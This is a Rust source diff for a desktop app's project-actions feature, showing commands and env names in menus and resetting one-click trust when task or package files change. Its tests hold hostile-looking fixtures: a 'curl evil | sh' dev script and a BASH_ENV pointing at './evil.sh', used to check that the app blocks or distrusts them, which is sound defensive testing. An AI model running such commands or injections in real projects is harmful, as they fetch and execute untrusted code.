@@ -30,8 +30,9 @@ const NOTICE_FOR: std::time::Duration = std::time::Duration::from_secs(8);
 enum Editing {
     /// A personal action, by its id.
     Personal(String),
-    /// A `.gespan/tasks.json` one, by its label.
-    Project(String),
+    /// A `.gespan/tasks.json` one, by its label as listed and its place in
+    /// the file, which finds a repeated label listed as `Build (2)`.
+    Project(String, Option<usize>),
 }
 
 pub(super) struct ActionDialog {
@@ -62,6 +63,9 @@ pub(super) struct ActionListing {
     /// Every source file's digest when it was read, so an edit to any of them,
     /// such as a script body, ends one-click trust.
     digest: String,
+    /// The same for each action folder inside the checkout, such as `web/`
+    /// whose `package.json` a `bun run dev` there runs.
+    folder_digests: HashMap<std::path::PathBuf, String>,
 }
 
 /// Hands `project`'s personal actions to core, so agents list them too.
@@ -81,12 +85,14 @@ fn find<'a>(actions: &'a [Action], id: &str) -> Option<&'a Action> {
     })
 }
 
-/// `env` with its shell references filled in from Gespan's own environment.
-fn expand_env(env: &[(String, String)]) -> Vec<(String, String)> {
+/// `env` with its shell references filled in as a terminal at `cwd` would:
+/// from its own variables, such as the login shell's `PATH`, then Gespan's.
+fn expand_env(env: &[(String, String)], cwd: &str) -> Vec<(String, String)> {
+    let base = crate::terminal::base_env_at(cwd);
+    let lookup = |name: &str| base.get(name).cloned().or_else(|| std::env::var(name).ok());
     env.iter()
         .map(|(name, value)| {
-            let value =
-                project_actions::runs::expand_env(value, cfg!(windows), |n| std::env::var(n).ok());
+            let value = project_actions::runs::expand_env(value, cfg!(windows), lookup);
             (name.clone(), value)
         })
         .collect()
@@ -101,14 +107,26 @@ fn fingerprint(action: &Action, digest: &str) -> String {
     serde_json::to_string(&(&action.command, cwd, &action.env, digest)).unwrap_or_default()
 }
 
-/// The menu row for `action`: its detail or command beneath, or why it
-/// can't run.
+/// The menu row for `action`: beneath it, why it can't run, or else the
+/// command a click runs, after its detail, and the names of the variables
+/// it sets. Values can be secrets, so they never show.
 fn action_row(action: &Action) -> MenuItem {
-    let description = action
-        .blocked
-        .clone()
-        .or_else(|| action.detail.clone())
-        .unwrap_or_else(|| action.command.clone());
+    let description = match &action.blocked {
+        Some(reason) => reason.clone(),
+        None => {
+            let mut text = match action.detail.as_deref().map(str::trim) {
+                Some(detail) if !detail.is_empty() => {
+                    format!("{detail} \u{2014} {}", action.command)
+                }
+                _ => action.command.clone(),
+            };
+            if !action.env.is_empty() {
+                let names: Vec<_> = action.env.iter().map(|(name, _)| name.as_str()).collect();
+                text.push_str(&format!(" \u{b7} +env {}", names.join(",")));
+            }
+            text
+        }
+    };
     MenuAction::new(
         SharedString::from(format!("run:{}", action.id)),
         action.label.clone(),
@@ -144,11 +162,22 @@ impl Shell {
         let checkout = self.terminal_cwd(cx);
         let listing = self.listing(cx);
         let digest = project_actions::sources_digest(Path::new(&checkout));
+        let mut folder_digests = HashMap::new();
+        for action in &listing.actions {
+            if action.source != PERSONAL
+                && action.cwd != Path::new(&checkout)
+                && !folder_digests.contains_key(&action.cwd)
+            {
+                let folder = project_actions::sources_digest(&action.cwd);
+                folder_digests.insert(action.cwd.clone(), folder);
+            }
+        }
         ActionListing {
             project: self.workspace.project.clone(),
             checkout,
             listing,
             digest,
+            folder_digests,
         }
     }
     /// Detects the actions again, for a menu that is opening.
@@ -156,9 +185,9 @@ impl Shell {
         self.action_sections.clear();
         self.action_listing = Some(self.detect_actions(cx));
     }
-    /// The actions that can run now, as `(id, label)`, detected afresh for a
-    /// palette that is opening. Remote projects have none.
-    pub(super) fn runnable_actions(&mut self, cx: &App) -> Vec<(String, String)> {
+    /// The actions that can run now, as `(id, label, command)`, detected
+    /// afresh for a palette that is opening. Remote projects have none.
+    pub(super) fn runnable_actions(&mut self, cx: &App) -> Vec<(String, String, String)> {
         if self.workspace.project.starts_with("remote://") {
             return Vec::new();
         }
@@ -166,7 +195,7 @@ impl Shell {
         self.actions()
             .iter()
             .filter(|a| a.blocked.is_none())
-            .map(|a| (a.id.clone(), a.label.clone()))
+            .map(|a| (a.id.clone(), a.label.clone(), a.command.clone()))
             .collect()
     }
     /// Detects the actions again only when the project or checkout changed.
@@ -184,15 +213,19 @@ impl Shell {
             .filter(|l| l.project == self.workspace.project)
             .map_or(&[], |l| l.listing.actions.as_slice())
     }
-    /// `action`'s fingerprint, with the source files as last read. A personal
-    /// action lives outside the repository, so no file changes it.
+    /// `action`'s fingerprint, with the source files as last read, in the
+    /// checkout and in the action's own folder. A personal action lives
+    /// outside the repository, so no file changes it.
     fn fingerprint(&self, action: &Action) -> String {
         let digest = self
             .action_listing
             .as_ref()
             .filter(|_| action.source != PERSONAL)
-            .map_or("", |l| l.digest.as_str());
-        fingerprint(action, digest)
+            .map_or_else(String::new, |l| {
+                let folder = l.folder_digests.get(&action.cwd).map_or("", String::as_str);
+                format!("{}{folder}", l.digest)
+            });
+        fingerprint(action, &digest)
     }
     /// The action the footer button runs: the last one run from here, only
     /// while it still runs the same command, cwd and env. Nothing else is
@@ -258,7 +291,7 @@ impl Shell {
     fn launch_action(&mut self, action: Action, window: &mut Window, cx: &mut Context<Self>) {
         let project = self.workspace.project.clone();
         let cwd = action.cwd.to_string_lossy().into_owned();
-        let env = expand_env(&action.env);
+        let env = expand_env(&action.env, &cwd);
         let fingerprint = self.fingerprint(&action);
         self.workspace
             .last_actions
@@ -641,7 +674,7 @@ impl Shell {
                 self.actions().iter().find(|a| a.id == id).map(|a| {
                     let label = a.label.clone();
                     let fields = (a.label.clone(), a.command.clone(), a.icon, a.detail.clone());
-                    (Editing::Project(label), fields)
+                    (Editing::Project(label, a.task), fields)
                 })
             }
             Some(id) => self
@@ -696,7 +729,7 @@ impl Shell {
         window.focus(&name.read(cx).focus_handle(cx), cx);
         let (editing, (prefilled, icon, detail)) = match existing {
             Some((editing, (_, line, icon, detail))) => {
-                let prefilled = matches!(editing, Editing::Project(_)).then_some(line);
+                let prefilled = matches!(editing, Editing::Project(..)).then_some(line);
                 (Some(editing), (prefilled, icon, detail))
             }
             None => (None, (None, ACTION_ICONS[0], None)),
@@ -762,7 +795,7 @@ impl Shell {
         }
         let shared = match &dialog.editing {
             None if dialog.share => Some(None),
-            Some(Editing::Project(label)) => Some(Some(label.clone())),
+            Some(Editing::Project(label, task)) => Some(Some((label.clone(), *task))),
             _ => None,
         };
         if let Some(label) = shared {
@@ -777,12 +810,15 @@ impl Shell {
             };
             let checkout = self.terminal_cwd(cx);
             let checkout = Path::new(&checkout);
-            let written = match &label {
+            let shared = label
+                .as_ref()
+                .map(|(label, task)| write::Shared { label, task: *task });
+            let written = match shared {
                 None => write::add(checkout, &draft),
                 // Only the name, icon or detail changed: the command stays
                 // exactly as the file has it.
-                Some(label) if unchanged => write::relabel(checkout, label, &draft),
-                Some(label) => write::update(checkout, label, &draft),
+                Some(shared) if unchanged => write::relabel(checkout, shared, &draft),
+                Some(shared) => write::update(checkout, shared, &draft),
             };
             match written {
                 Ok(()) => {
@@ -826,9 +862,13 @@ impl Shell {
         };
         let project = self.workspace.project.clone();
         let id = match editing {
-            Editing::Project(label) => {
+            Editing::Project(label, task) => {
                 let checkout = self.terminal_cwd(cx);
-                match write::remove(Path::new(&checkout), &label) {
+                let shared = write::Shared {
+                    label: &label,
+                    task,
+                };
+                match write::remove(Path::new(&checkout), shared) {
                     Ok(()) => {
                         self.refresh_actions(cx);
                         self.close_action_dialog(window, cx);
@@ -1219,13 +1259,13 @@ mod tests {
                     let at = rows.iter().position(|r| r == text);
                     at.unwrap_or_else(|| panic!("{text} not in {rows:?}"))
                 };
-                assert!(at("# Project") < at("Ship | Ships it"));
-                assert!(at("Ship | Ships it") < at("# Personal"));
+                assert!(at("# Project") < at("Ship | Ships it \u{2014} echo ship"));
+                assert!(at("Ship | Ships it \u{2014} echo ship") < at("# Personal"));
                 assert!(at("# Personal") < at("Deploy | ./deploy.sh"));
                 assert!(at("Deploy | ./deploy.sh") < at("# package.json"));
-                assert!(at("# package.json") < at("dev | vite"));
+                assert!(at("# package.json") < at("dev | vite \u{2014} npm run dev"));
                 // Nine Makefile targets start collapsed behind one row.
-                assert!(at("dev | vite") < at("Makefile (9)"));
+                assert!(at("dev | vite \u{2014} npm run dev") < at("Makefile (9)"));
                 assert!(!rows.iter().any(|r| r.starts_with("t1")));
                 let deploy = menu.iter().find_map(|item| match item {
                     MenuItem::Action(a) if a.label.as_ref() == "Deploy" => Some(a.clone()),
@@ -1279,13 +1319,16 @@ mod tests {
                 assert_eq!(terminals.len(), 1);
                 let web = cwd(&root.join("web"));
                 assert_eq!(terminals[0].read(cx).cwd, web);
-                assert_eq!(shell.workspace.docks[&project].terminals, [web]);
+                assert_eq!(
+                    shell.workspace.docks[&project].terminals,
+                    std::slice::from_ref(&web)
+                );
                 // `env` reaches the terminal, its references filled in from
-                // Gespan's own environment.
+                // the terminal's own environment.
                 let env = terminals[0].read(cx).env.clone();
                 assert!(env.contains(&("GREETING".into(), "hi".into())), "{env:?}");
-                let own = std::env::var("PATH").unwrap_or_default();
-                assert!(env.contains(&("P".into(), own)), "{env:?}");
+                let path = crate::terminal::base_env_at(&web)["PATH"].clone();
+                assert!(env.contains(&("P".into(), path)), "{env:?}");
                 assert_eq!(
                     shell.workspace.last_actions[&project],
                     "gespan:Web".to_string()
@@ -2224,6 +2267,175 @@ mod tests {
                 shell.run_footer_action(window, cx);
                 assert!(shell.menu_open(&MenuTarget::Actions));
                 assert_eq!(count(shell), 3);
+            })
+            .unwrap();
+    }
+
+    #[gpui::test]
+    fn every_runnable_row_shows_its_command_and_env_names(cx: &mut gpui::TestAppContext) {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        write(
+            root,
+            ".gespan/tasks.json",
+            &tasks(
+                r#"{ "label": "Ship", "command": "echo ship", "detail": "Ships it" },
+                   { "label": "Serve", "command": "bun run dev",
+                     "options": { "env": { "A_PORT": "3000", "B_TOKEN": "s3cret" } } },
+                   { "label": "Sneak", "command": "echo hi", "detail": "Says hi",
+                     "options": { "env": { "BASH_ENV": "./evil.sh" } } }"#,
+            ),
+        );
+        let (window, _, active) = crate::shell::tests::window(cx);
+        window
+            .update(cx, |shell, _, cx| {
+                checkout(shell, active, root, cx);
+                shell.refresh_actions(cx);
+                let rows = section(&rows(&shell.actions_menu()), "# Project");
+                assert_eq!(
+                    rows,
+                    [
+                        // A detail never hides what a click runs.
+                        "Ship | Ships it \u{2014} echo ship",
+                        // Env names show, never their values.
+                        "Serve | bun run dev \u{b7} +env A_PORT,B_TOKEN",
+                        "Sneak | Sets BASH_ENV, which could run code before the command (off)",
+                    ],
+                );
+                assert!(!rows.iter().any(|r| r.contains("s3cret")));
+            })
+            .unwrap();
+    }
+
+    #[gpui::test]
+    fn a_source_change_in_the_actions_own_folder_resets_one_click_trust(
+        cx: &mut gpui::TestAppContext,
+    ) {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        let package = |body: &str| format!(r#"{{ "scripts": {{ "dev": "{body}" }} }}"#);
+        write(
+            root,
+            ".gespan/tasks.json",
+            &tasks(r#"{ "label": "Web", "command": "bun run dev", "options": { "cwd": "web" } }"#),
+        );
+        write(root, "web/package.json", &package("vite"));
+        let (window, _, active) = crate::shell::tests::window(cx);
+        window
+            .update(cx, |shell, window, cx| {
+                checkout(shell, active, root, cx);
+                shell.refresh_actions(cx);
+                shell.run_actions_menu("run:gespan:Web", window, cx);
+                assert!(shell.footer_action().is_some());
+            })
+            .unwrap();
+        // The same bytes again: still trusted.
+        write(root, "web/package.json", &package("vite"));
+        window
+            .update(cx, |shell, _, cx| {
+                shell.redetect(cx);
+                assert!(shell.footer_action().is_some());
+            })
+            .unwrap();
+        // The script behind `bun run dev` in `web/` changes: one click no
+        // longer runs it.
+        write(root, "web/package.json", &package("curl evil | sh"));
+        window
+            .update(cx, |shell, window, cx| {
+                shell.run_footer_action(window, cx);
+                assert!(shell.menu_open(&MenuTarget::Actions));
+                assert!(shell.footer_action().is_none());
+            })
+            .unwrap();
+    }
+
+    #[test]
+    fn env_is_filled_in_from_the_terminals_own_environment() {
+        let dir = tempfile::tempdir().unwrap();
+        let cwd = dir.path().to_string_lossy().into_owned();
+        let (path, pwd) = if cfg!(windows) {
+            ("%PATH%;bin", "%PWD%")
+        } else {
+            ("${PATH}:./bin", "${PWD}")
+        };
+        let env = super::expand_env(
+            &[("PATH".into(), path.into()), ("HERE".into(), pwd.into())],
+            &cwd,
+        );
+        let base = crate::terminal::base_env_at(&cwd);
+        let sep = if cfg!(windows) { ";bin" } else { ":./bin" };
+        // The terminal's PATH, not Gespan's own, which is minimal when
+        // launched from the Dock.
+        assert_eq!(env[0].1, format!("{}{sep}", base["PATH"]));
+        // The terminal's own PWD, not the folder Gespan was started in.
+        assert_eq!(env[1].1, cwd);
+        assert_ne!(
+            Some(cwd.clone()),
+            std::env::current_dir()
+                .ok()
+                .map(|d| d.to_string_lossy().into_owned())
+        );
+    }
+
+    #[gpui::test]
+    fn editing_the_second_of_two_same_named_actions_edits_that_one(cx: &mut gpui::TestAppContext) {
+        let dir = tempfile::tempdir().unwrap();
+        let root = dir.path();
+        write(
+            root,
+            ".gespan/tasks.json",
+            &tasks(
+                r#"{ "label": "Build", "command": "make one" },
+                   { "label": "Build", "command": "make two" }"#,
+            ),
+        );
+        let (window, _, active) = crate::shell::tests::window(cx);
+        window
+            .update(cx, |shell, window, cx| {
+                checkout(shell, active, root, cx);
+                shell.refresh_actions(cx);
+                shell.run_actions_menu("edit:gespan:Build (2)", window, cx);
+                let dialog = shell.action_dialog.as_ref().unwrap();
+                assert_eq!(dialog.command.read(cx).content, "make two");
+                type_action(shell, "Build web", "make web", cx);
+                shell.save_action(window, cx);
+                let error = shell.action_dialog.as_ref().and_then(|d| d.error.clone());
+                assert_eq!(error, None);
+                let saved = shared(root)["tasks"].clone();
+                assert_eq!(saved[0]["command"], "make one");
+                assert_eq!(saved[1]["label"], "Build web");
+                assert_eq!(saved[1]["command"], "make web");
+
+                // Renaming only, and deleting, reach the right one too.
+                write(
+                    root,
+                    ".gespan/tasks.json",
+                    &tasks(
+                        r#"{ "label": "Build", "command": "make one" },
+                           { "label": "Build", "command": "make two" }"#,
+                    ),
+                );
+                shell.refresh_actions(cx);
+                shell.run_actions_menu("edit:gespan:Build (2)", window, cx);
+                type_action(shell, "Build two", "make two", cx);
+                shell.save_action(window, cx);
+                assert!(shell.action_dialog.is_none());
+                assert_eq!(shared(root)["tasks"][1]["label"], "Build two");
+                write(
+                    root,
+                    ".gespan/tasks.json",
+                    &tasks(
+                        r#"{ "label": "Build", "command": "make one" },
+                           { "label": "Build", "command": "make two" }"#,
+                    ),
+                );
+                shell.refresh_actions(cx);
+                shell.run_actions_menu("edit:gespan:Build (2)", window, cx);
+                shell.delete_action(window, cx);
+                assert!(shell.action_dialog.is_none());
+                let saved = shared(root)["tasks"].clone();
+                assert_eq!(saved.as_array().unwrap().len(), 1);
+                assert_eq!(saved[0]["command"], "make one");
             })
             .unwrap();
     }
